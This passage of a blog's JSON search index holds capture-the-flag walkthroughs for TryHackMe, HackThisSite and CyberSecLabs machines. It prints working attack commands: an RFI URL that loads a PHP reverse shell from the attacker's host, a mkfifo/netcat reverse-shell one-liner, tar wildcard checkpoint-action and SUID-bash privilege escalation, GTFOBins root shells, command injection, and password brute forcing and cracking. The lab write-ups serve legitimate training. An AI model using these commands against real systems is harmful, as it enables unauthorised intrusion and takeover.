force ssh and see if we can find something.FootholdTo brute force ssh, we can use hydra.We managed to get the correct password for lin, let’s login with ssh now.Privilege EscalationNow that we have access to the machine, let’s what we can do.By running sudo -l, we see that we can run /usr/tar as root, we can use GTFOBins to see how we can leverage that and get root.We can use that command to get a root shell.And just like that we became root.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "HackThisSite - Basic mission 7", "url": "/posts/HTS-Basic7/", "categories": "HackThisSite, Basic missions", "tags": "hackthissite, hts, easy, web, basic", "date": "2022-03-29 00:00:00 +0000", "snippet": "DescriptionHello l33ts, I hope you are doing well. We will be doing Basic mission 7 from HackThisSiteSolutionLet’s navigate to the challenge page.With the script Sam has set up, we can enter a year’s and get its calendar.The user input get passed to the cal command, so the full command would like this cal {user_input} and we get back the output of that command. We can escape the cal command with a semi-colon and run the ls command, entering ;ls will result in the following:We managed to list the content of the directory the strangely named php file that contains the password, navigating to it gives us the password.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "TryHackMe - Skynet", "url": "/posts/THM-Skynet/", "categories": "TryHackMe", "tags": "tryhackme, linux, web, lfi, rfi, cronjob, wildcard, smb", "date": "2022-03-27 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. We are doing Skynet from TryHackMeEnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.96.15 Host is up (0.096s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)| 256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)|_ 256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Skynet110/tcp open pop3 Dovecot pop3d|_pop3-capabilities: CAPA PIPELINING UIDL AUTH-RESP-CODE TOP SASL RESP-CODES139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open imap Dovecot imapd|_imap-capabilities: listed LOGINDISABLEDA0001 more post-login have capabilities Pre-login OK IMAP4rev1 IDLE ID SASL-IR ENABLE LITERAL+ LOGIN-REFERRALS445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 1h18m51s, deviation: 2h53m12s, median: -21m08s| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb2-security-mode:| 3.1.1:|_ Message signing enabled but not required| smb2-time:| date: 2022-03-26T15:20:20|_ start_date: N/A| smb-os-discovery:| OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: skynet| NetBIOS computer name: SKYNET\\x00| Domain name: \\x00| FQDN: skynet|_ System time: 2022-03-26T10:20:20-05:00There are 5 open ports, let’s start enumerating the webserver.WebServerLet’s navigate to the webpage http://{target_IP}/We see what looks like search engine, nothing in the source code, let’s do a directory enumeration.Gobuster===============================================================[+] Url: http://10.10.96.15[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/03/26 11:51:58 Starting gobuster in directory enumeration mode===============================================================/.htaccess (Status: 403) [Size: 276]/.htpasswd (Status: 403) [Size: 276]/admin (Status: 301) [Size: 310] [--&gt; http://10.10.96.15/admin/]/ai (Status: 301) [Size: 307] [--&gt; http://10.10.96.15/ai/] /config (Status: 301) [Size: 311] [--&gt; http://10.10.96.15/config/]/css (Status: 301) [Size: 308] [--&gt; http://10.10.96.15/css/] /js (Status: 301) [Size: 307] [--&gt; http://10.10.96.15/js/] /server-status (Status: 403) [Size: 276] /squirrelmail (Status: 301) [Size: 317] [--&gt; http://10.10.96.15/squirrelmail/]===============================================================We found the interesting directory /squirrelmail, let’s navigate to it.It is a login page of SquirrelMail, since we don’t have any credentials for that, let’s continue our enumeration elsewhere.SMBWe can enumerate SMB using enum4linux, the commands is enum4linux {target_IP}From this scan, we found the username milesdyson and 2 interesting share; anonymous and milesdyson. To login to the SMB shares, we can use smbclient, the command would look like this:sudo smbclient -N \\\\\\\\{target_IP}\\\\{share-name}. -N options tells smbclient to login without a password.We can’t access milesdyson share, but we can access anonymous share.Inside the anonymous share, we found a attention.txt file and a log1.txt, we can download the two files using the command get {filename}. Let’s see what’s inside the two files.The attention.txt file has a note from milesdyson that says that the employees need to change their password due to a system malfunction, the log1.txt file contains what looks like a list of passwords.We have a username and a list of passwords, let’s brute force the login page of SquirrelMail and see if we can find the password. I used burp intruder to do the job, and i was able to find the password.To spot the working password, we can look at the length and the status code of the response, the real password has a different value compared to other passwords.Let’s try now login to the mail service.We managed to login successfully, and we can see milesdyson’s emails, one of the emails has samba password reset as a subject, let’s take a look at it.We find the password of smb, let’s login to the milesdyson share with the user milesdyson.sudo smbclient -U milesdyson \\\\\\\\{target_IP}\\\\milesdysonWe managed to login to milesdyson share, inside the share some pdf files and notes directory, let’s see what’s inside it.There are a lot pdf files, but there is an interesting file names important.txt, let’s download it to our machine with get important.txt and take a look at it.The file revealed a web directory, let’s navigate to it.It says it’s Miles Dyson personal page, let’s run a directory scan on it.===============================================================[+] Url: http://10.10.96.15/45kra24zxs28v3yd[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/03/26 12:34:18 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 276]/.htaccess (Status: 403) [Size: 276]/.htpasswd (Status: 403) [Size: 276]/administrator (Status: 301) [Size: 335] [--&gt; http://10.10.96.15/45kra24zxs28v3yd/administrator/]/index.html (Status: 200) [Size: 418] ===============================================================We found /administrator directory, let’s go to it.It’s a login page of Cuppa CMS, i tried some knows credentials but it didn’t work. Let’s search if this cms has any vulnerabilities.Indeed, we found a Local/Remote File inclusion vulnerability. With this vulnerability, we can read file on the server and upload files and run them on the server. Let’s see how to exploit this.FootholdLet’s navigate to the exploit we have found.The path of the vulnerability is cuppa/alerts/alertConfigField.php?urlConfig=[FI], with the urlConfig we can either enter a path for a local file to read or a url that contains a file.I setup a http server that has a php reverse shell code in it, i then setup a netcat listener on my machine and used the rfi path to server the php code.http://{target_IP}/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://{attacker_ip}/reverse_shell.phpGreat! We got a shell, i used python pty trick to stabilize my shell. Let’s do some enumeration on the machine now.Privilege EscalationLet’s do some basic enumeration first.On milesdyson home directory a backups directory that has two files, backup.sh and backup.tgz. We can notice that backup.tgz has been modified very recently, the backup.sh file is readable so let’s see what it does.The script takes a backup of /var/www/html, the webpage files, and put the backup where we saw it, and there is a cronjob that runs the script as root.The thing we notice about backup.sh script is that it uses wildcard. I searched on google on how to exploit this and found this useful article that explains how to exploit the wildcard.In my case, i changed the directory to /var/www/html, created a file named shell.sh with this command in it cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash, this command puts a copy of /bin/bash in /tmp/bash and give it suid permission so that we can run it as root, after that i created the following two file with echo \"\" &gt; \"--checkpoint-action=exec=sh shell.sh\" and echo \"\" &gt; --checkpoint=1, and when the backup.sh script runs, it will execute our shell.sh script, and if we check the /tmp directory, we will be able to find the bash binary with suid permission.We can run /tmp/bash -p and get root.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "TryHackMe - Thompson", "url": "/posts/THM-Thompson/", "categories": "TryHackMe", "tags": "tryhackme, linux, web, metasploit, rce, cronjob, suid", "date": "2022-03-25 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Thompson from TryHackMe. It’s an easy machine where we find a mis-configured Apache Tomcat server that leads to an information disclosure where where get a username and password for Tomcat manager. We use an exploit that gives us a remote shell on the machine, with some enumeration we find a cronjob that runs a world writable script as root, we exploit that and get root access.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.109.215Host is up (0.092s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)| 256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)|_ 256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)8009/tcp open ajp13 Apache Jserv (Protocol v1.3)|_ajp-methods: Failed to get a valid response for the OPTION request8080/tcp open http Apache Tomcat 8.5.5|_http-title: Apache Tomcat/8.5.5|_http-favicon: Apache TomcatService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelThere are 3 open ports, port 8080 is running apache tomcat, let’s navigate to the webpage at {target_IP}:8080WebPageWe see the default page of Apache Tomcat.Let’s run a directory scan to see if there is anything useful.Gobuster===============================================================[+] Url: http://10.10.70.81:8080/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s=============================================================== 05:18:22 Starting gobuster in directory enumeration mode===============================================================/docs (Status: 302) [Size: 0] [--&gt; /docs/]/examples (Status: 302) [Size: 0] [--&gt; /examples/]/favicon.ico (Status: 200) [Size: 21630] /manager (Status: 302) [Size: 0] [--&gt; /manager/]===============================================================There is a /manager page, let’s go there on http://{target_IP}:8080/manager.We are being to enter a username and password, i tried some known credentials like admin:admin and admin:password but got nothing, if we hit Cancel, we see the following.We get redirected to this unauthorized access error page, where we can find the username and password for the manager page. Now we can go and login.FootholdNow that we have access to Tomcat manager, i searched on google for ways to get code execution on tomcat, and i found a module on metasploit that can give us a shell on the machine, the module is called exploit/multi/http/tomcat_mgr_upload.We need to set the username and password of the Tomcat manager along with the other necessary options, and run the exploit.We have successfully gained a shell on our target.Privilege EscalationLet’s do some manual enumeration on the machine.We found a user named jack, on his home directory, there are two interesting files, id.sh and test.txt.The id.sh file has a command that runs the command id and put the output of that command into the file test.txt, and in the latter file, we see the output of the id command that was run by root. We can also notice that from all the other files, test.txt got modified very lately in comparison with other files, this means that there is a cronjob running on the machine, let’s check /etc/crontab for cron jobs.We found a cronjob that is run by root, and what it does is it moves to /home/jack directory and runs the id.sh script. We saw on jack’s home directory that the id.sh file is writable. With that, we can change the content of that file and put a command on it that would permit us to become root.First, i dropped a shell, used python pty trick to get a nice shell, then i put the command in id.sh. The command i used takes a copy of /bin/bash and put it in /tmp directory, then it gives it suid permission so that we can run it as it’s owner which is root. We can run the command /tmp/bash -p for rootAnd just like that, we have rooted the machine.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "TryHackMe - Anonforce", "url": "/posts/THM-Anonforce/", "categories": "TryHackMe", "tags": "tryhackme, linux, ftp, cryptography, gpg, john, hashcat, crack", "date": "2022-03-23 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Anonforce from TryHackMe, an easy machine where we are able to login to ftp as anonymous and see all of the system files of the machine, we find an unusual directory that contains an encrypted file, we decrypt it and get some hashes that we will be able to crack one of them and get root access.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.175.75 Host is up (0.10s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxr-xr-x 2 0 0 4096 Aug 11 2019 bin| drwxr-xr-x 3 0 0 4096 Aug 11 2019 boot| drwxr-xr-x 17 0 0 3700 Mar 22 11:12 dev| drwxr-xr-x 85 0 0 4096 Aug 13 2019 etc| drwxr-xr-x 3 0 0 4096 Aug 11 2019 home| lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img -&gt; boot/initrd.img-4.4.0-157-generic| lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img.old -&gt; boot/initrd.img-4.4.0-142-generic| drwxr-xr-x 19 0 0 4096 Aug 11 2019 lib| drwxr-xr-x 2 0 0 4096 Aug 11 2019 lib64| drwx------ 2 0 0 16384 Aug 11 2019 lost+found| drwxr-xr-x 4 0 0 4096 Aug 11 2019 media| drwxr-xr-x 2 0 0 4096 Feb 26 2019 mnt| drwxrwxrwx 2 1000 1000 4096 Aug 11 2019 notread [NSE: writeable]| drwxr-xr-x 2 0 0 4096 Aug 11 2019 opt| dr-xr-xr-x 94 0 0 0 Mar 22 11:12 proc| drwx------ 3 0 0 4096 Aug 11 2019 root| drwxr-xr-x 18 0 0 540 Mar 22 11:13 run| drwxr-xr-x 2 0 0 12288 Aug 11 2019 sbin| drwxr-xr-x 3 0 0 4096 Aug 11 2019 srv| dr-xr-xr-x 13 0 0 0 Mar 22 11:12 sys|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.| ftp-syst:| STAT:| FTP server status:| Connected to ::ffff:10.11.31.131| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)| 256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)|_ 256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelThere are two open port, 21(FTP) and 22(SSH).FTPFrom the nmap scan, anonymous login seems to be enabled on the ftp server. Let’s login by typing the following command ftp {target_IP}, for the username enter anonymous and password can be submitted blank.FootholdWe see that we are in the root of the file system of a linux machine. Looking at these directories/files, we see an unusual directory called notread, let’s see what’s there.There is a pgp encrypted file named backup.pgp and file named private.asc which seems to be private key for the encrypted file, let’s get those file into our attacking machine. We can do that by running get filename on the ftp prompt.We can also navigate to the home page and file a user that have the user flag, use get user.txt to download the file to your machine.After getting those 2 file, we can use the command gpg to decrypt the file. First we need to import the private key, we can do that with the following command gpg --import private.asc, and to decrypt it we can run gpg --output backup --decrypt backup.pgpWe were asked for a password when we tried to decrypt the file, that’s because the private key is protected with a password. We can use gpg2john to get a hash and use john to crack that hash.Great! We managed to crack the hash and get the private key’s password, let’s decrypt the file now.After decrypting the file, we get a copy of shadow file that contains password hashes for melodias and root.Privilege EscalationLet’s try to crack the root hash with hashcat, first copy the hash to a file and run the command hashcat -m 1800 roothash /usr/share/wordlists/rockyou.txtGreat! We managed to crack the root hash, let’s now ssh to the machine and grab the flag.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "TryHackMe - Ignite", "url": "/posts/THM-Ignite/", "categories": "TryHackMe", "tags": "tryhackme, linux, rce, exploit", "date": "2022-03-21 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Ignite from TryHackMe, and easy machine where we find a CMS vulnerable to RCE, we use an exploit to help us get a reverse shell on the machine, then we look through the CMS files to find a plain text password of root.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressice scan to provide faster results. Nmap scan report for 10.10.89.94Host is up (0.11s latency).Not shown: 999 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Welcome to FUEL CMS|_http-server-header: Apache/2.4.18 (Ubuntu)| http-robots.txt: 1 disallowed entry|_/fuel/We only have port 80 open, and there is a robots.txt file, let’s run a directory scan while we go check the webpage.WebPageLet’s navigate to the webpage.We have Fuel CMS with version 1.4 running on the webserver. There is nothing else, let’s check what we got from the directory scan.Gobuster===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.239.131/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/dirb/wordlists/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s=============================================================== Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 292]/.htaccess (Status: 403) [Size: 297]/.htpasswd (Status: 403) [Size: 297]/@ (Status: 400) [Size: 1134]/0 (Status: 200) [Size: 16597]/assets (Status: 301) [Size: 315] [--&gt; http://10.10.239.131/assets/]/home (Status: 200) [Size: 16597] /index (Status: 200) [Size: 16597] /index.php (Status: 200) [Size: 16597] /lost+found (Status: 400) [Size: 1134] /offline (Status: 200) [Size: 70] /robots.txt (Status: 200) [Size: 30] /server-status (Status: 403) [Size: 301] ===============================================================Let’s navigate to /robots.txt.There is 1 disallowed entry, /fuel, let’s see what there.We found a login page for fuelcms, let’s see if we can get in by submitting some knows credentials.I managed to login using admin:adminLet’s check if there is any exploit for this version of fuel cms.We found 3 RCE exploit, let’s download one of the exploit and try run some commands. I will be using this exploit.FootholdLet’s run the exploit now.We are able now to execute code on the machine, let’s get a proper shell.First, setup a listener on your attacking machine(nc -lnvp 9001) and execute the following command on the RCE prompt rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.10.10 9001 &gt;/tmp/f NOTE: Change the ip address on the commandI used the python import pty trick to stabilize my shell.Privilege EscalationFor Privilege Escalation, i uploaded linpeas to the machine to do the scan for me.Let’s run the script and see what it will find.There is a root password in plain text in one of the file of the application. Let’s see if it works.Great! The password worked and we got root access.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "CyberSecLabs - Shares", "url": "/posts/CSL-Shares/", "categories": "CyberSecLabs", "tags": "cyberselabs, linux, nfs, john, crack", "date": "2022-03-19 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. Today we are going to look at from Shares from CyberSecLabs.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressice scan to provide faster results. There are 4 open port. 21/tcp ftp vsftpd 3.0.3 80/tcp http Apache httpd 2.4.29 111/tcp rpcbind 2-4 2049/tcp nfs_acl 3Since the machine is called shares, i decided to look for any nfs shares.NFSWe can list nfs shares using the following command: showmount -e {target_IP}We found a share, let’s mount it on our attacking machine.First, use mkdir /tmp/share to create a directory on your machine to mount the share to. Now let’s use the following command to mount the nfs share to our machine. sudo mount -t nfs IP:/home/amir /tmp/share -nolock sudo :\tRun as root mount :\tExecute the mount command -t nfs :\tType of device to mount, then specifying that it’s NFS IP:share :\tThe IP Address of the NFS server, and the name of the share we wish to mount -nolock :\tSpecifies not to use NLM lockingGreat! We have successfully mounted the share.It appears to be the home directory of amir, and it a .ssh directory that contains a private key, but when we run a port scan, there was no ssh service listening on the machine, let’s run another scan for all ports. sudo nmap -p- {target_IP}Great! We found the port of ssh.FootholdLet’s now use the private key we got from the nfs share so connect to the machine.the private key has a password protecting it, using ssh2john we were able to extract a hash that we managed to crack using john. Let’s try connecting again.Privilege EscalationWe now have access to the machine as amir, let’s do some basic enumeration.amir@shares:~$ sudo -lMatching Defaults entries for amir on shares: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser amir may run the following commands on shares: (ALL : ALL) ALL (amy) NOPASSWD: /usr/bin/pkexec (amy) NOPASSWD: /usr/bin/python3We see that as amir, we can execute any command as root but we need a password for that, on the other hand, we can execute /usr/bin/pkexec and /usr/bin/python3 as amy. We go to GTFOBins and get a pkexec/python3 command that would give us a shell as amy. python3 : sudo -u amy python -c 'import os; os.system(\"/bin/bash\")' pkexec : sudo -u amy pkexec /bin/shWe can’t escalate to amy with pkexec so let’s use python3We have amy’s shell now, let’s run another sudo -l to see what we can run.amy@shares:~$ sudo -lMatching Defaults entries for amy on shares: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser amy may run the following commands on shares: (ALL) NOPASSWD: /usr/bin/sshWe can run ssh as root.Going back to GTFOBins and searching for ssh, we find that we can run the following command to get root sudo ssh -o ProxyCommand=';bash 0&lt;&amp;2 1&gt;&amp;2' xThank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "HackThisSite - Basic mission 6", "url": "/posts/HTS-Basic6/", "categories": "HackThisSite, Basic missions", "tags": "hackthissite, hts, easy, web, basic, html, python", "date": "2022-03-17 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. We will be doing basic mission 6 from HackThisSiteSolutionLet’s navigate to the challenge page.Well, our friend Sam made an encryption system, encrypted his password with it, and made it available for us to use. Let’s see how this works. I will enter the word “password” and see what happens.It encrypted the word i gave it, let’s give it other words to study it more.It looks like the encryption system take the string we give it, converts every character in it to it’s corresponding decimal value on an ASCII Table and does the following. The first one will be incremented by 0. The second will be incremented by 1. The third will be incremented by 2 and so on.Then it converts it back into characters.I made a simple python script that does the same thing to better understand it.password = input(\"Enter the password you want to encrypt : \")encrypted = ''x=0for i in password: encrypted = encrypted + chr(ord(i) + x) x = x + 1print(encrypted)We can reverse this process decrementing numbers instead of incrementing them, so it will be like this: The first one will be decremented by 0. The second will be decremented by 1. The third will be decremented by 2 and so on.Also made a python script for that.password = ''encrypted = input (\"Enter the password you want to decrypt\")x = 0for i in encrypted: password = password + chr (ord(i) - x) x = x + 1print(password)I tested both the scripts and solved the challenge using them.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "HackThisSite - Basic mission 5", "url": "/posts/HTS-Basic5/", "categories": "HackThisSite, Basic missions", "tags": "hackthissite, hts, easy, web, basic, html", "date": "2022-03-17 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. We will be doing basic mission 5 from HackThisSiteSolutionLet’s navigate to the challenge page.Applying the same technique we used in Level 4, we will be able to get the password sent to our email.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "HackThisSite - Basic mission 4", "url": "/posts/HTS-Basic4/", "categories": "HackThisSite, Basic missions", "tags": "hackthissite, hts, easy, web, basic, html", "date": "2022-03-15 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. We will be doing basic mission 4 from HackThisSiteSolutionLet’s navigate to the challenge page.With that information, let’s check the source code for anything useful.Looking through the source code, we can indeed see Sam’s email address, and if we pressed Send password to Sam button, it tells us Password reminder successfully sent.We can use Burp Suite to intercept the request, change Sam’s email to our email, and forward the request to receive the password.Steps Launch Burp Suite and turn intercept on. Press Send password to Sam button, we will be able to see that the request is intercepted by Burp. Change Sam’s email to your email and turn intercept off.Going back to our browser, we see that the password reminder successfully sent to our email.For this to actually work, you need to use the email on your HackThisSite profile. The email you will receive will look like this.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "HackThisSite - Basic mission 3", "url": "/posts/HTS-Basic3/", "categories": "HackThisSite, Basic missions", "tags": "hackthissite, hts, easy, web, basic, html", "date": "2022-03-15 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. We will be doing basic mission 3 from HackThisSiteSolutionLet’s navigate to the challenge page.Sam fixed the problem and uploaded the password file, let’s check the source code.There is a hidden field named file and it’s value is password.php, so that might be the password file Sam uploaded, let’s navigate to it: https://www.hackthissite.org/missions/basic/3/password.php.Great! It is the password file, submit the password and let’s move to the next challenge.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "TryHackMe - Basic Pentesting", "url": "/posts/THM-BasicPenstesting/", "categories": "TryHackMe", "tags": "tryhackme, linux, smb, john, crack, hydra", "date": "2022-03-13 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. We will be doing Basic Pentesting from TryHackMe. It’s an easy machine where we enumerate SMB to get a username, we brute force ssh after that to get a password that will give us access to the machine. Some basic enumeration on the machine after that will give us a way to get root. Let’s get into it.EnumerationNmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressice scan to provide faster results. Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-14 12:12 EDT Nmap scan report for 10.10.226.39 Host is up (0.097s latency). Not shown: 994 closed tcp ports (reset)PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA) | 256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA) |_ 256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)8009/tcp open ajp13? | ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS 8080/tcp open http-proxy | fingerprint-strings: | LDAPBindReq: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 2243| Date: Mon, 14 Mar 2022 15:54:14 GMT| Connection: close| &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400| Request&lt;/title&gt;&lt;style type=\"text/css\"&gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;bod| SIPOptions:| HTTP/1.1 400| Content-Type: text/html;charset=utf-8| Content-Language: en| Content-Length: 2154| Date: Mon, 14 Mar 2022 15:54:15 GMT| Connection: close| &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400|_ Request&lt;/title&gt;&lt;style type=\"text/css\"&gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;bod|_http-favicon: Apache Tomcat|_http-title: Apache Tomcat/9.0.71 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgHost script results:| smb-os-discovery:| OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: basic2| NetBIOS computer name: BASIC2\\x00| Domain name: \\x00| FQDN: basic2|_ System time: 2022-03-14T11:54:19-04:00|_clock-skew: mean: 59m33s, deviation: 2h18m34s, median: -20m27s| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_nbstat: NetBIOS name: BASIC2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb2-time:| date: 